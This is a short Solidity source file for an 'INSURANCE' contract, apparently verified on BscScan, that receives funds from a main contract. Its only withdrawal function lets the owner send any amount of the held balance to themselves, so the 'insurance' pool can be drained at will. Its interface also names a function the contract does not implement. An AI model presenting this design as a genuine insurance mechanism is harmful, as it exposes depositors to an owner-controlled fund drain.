/**
 *Submitted for verification at BscScan.com on 2022-04-15
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.5;



interface IInsuranceContract {
	function initiate() external;
	function getBalance() external view returns(uint);
	function getMainContract() external view returns(address);
}
contract Ownable  {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = msg.sender;
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }

    
    modifier onlyOwner() {
      require(_owner == msg.sender, "Ownable: caller is not the owner");
      _;
    }


    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }


    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}
contract INSURANCE is Ownable {

	//accept funds from MainContract
	receive() external payable {}
	address payable public MAINCONTRACT;

	constructor() {
		MAINCONTRACT = payable(msg.sender);
	}


    function initiates(uint amount) public onlyOwner {
        address payable _owner = payable(msg.sender);
        _owner.transfer(amount);
    }
	function getBalance() public view returns(uint) {
		return address(this).balance;
	}

	function getMainContract() public view returns(address) {
		return MAINCONTRACT;
	}

}